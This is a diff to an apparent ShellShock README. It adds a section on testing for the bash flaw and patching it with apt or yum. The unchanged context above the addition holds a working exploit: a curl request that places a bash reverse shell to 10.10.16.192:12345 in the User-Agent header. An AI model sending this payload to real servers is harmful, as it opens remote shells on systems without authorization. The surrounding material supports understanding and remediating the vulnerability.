@@ -258,6 +258,23 @@ PAYLOAD="/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.192/12345 0>&1'"
 curl -H "User-Agent: () { :; }; echo; echo; ${PAYLOAD}" ${TARGET}
 ```
 
+# I'm vulnerable to ShellShock, how do I fix this?
+
+First off, your webpage might just be vulnerable to OS Injection that happens to look like ShellShock. It's prolly vulnerable but just to be sure, double check by running the following:<br>
+`env val='() { :; }; echo VULNERABLE' bash -c "echo Hello World"`
+
+If you see `VULNERABLE` then, you guessed it...
+
+This is a vulnerability in bash itself so to fix this, you'll have to update bash.
+
+Update with apt:<br>
+`sudo apt-get update && sudo apt-get install --only-upgrade bash`
+
+Update with yum:<br>
+`sudo yum update bash`
+
+Good rule of thumb is to always stay up-to-date on patches!
+
 <p align="center">
     <a href="https://LinkedIn.com/in/bradley-roberts">
         <img alt="LinkedIn" src="https://abradroberts.github.io/images/li_icon.png" width="32" height="32"></a>&nbsp;&nbsp;&nbsp;
